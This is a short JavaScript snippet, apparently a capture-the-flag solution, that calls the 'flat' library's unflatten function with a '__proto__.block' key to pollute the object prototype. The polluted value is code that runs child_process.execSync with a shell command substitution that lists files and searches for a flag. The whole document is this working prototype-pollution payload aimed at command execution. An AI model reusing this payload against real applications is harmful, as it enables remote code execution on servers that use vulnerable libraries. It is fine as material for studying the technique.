const { unflatten } = require("flat");

const { artist } = unflatten({
  "artist.name": "Haigh",
  "__proto__.block": {
    line:
      "process.mainModule.require('child_process').execSync('$(ls | grep flag)')"
  }
});

console.log(artist);
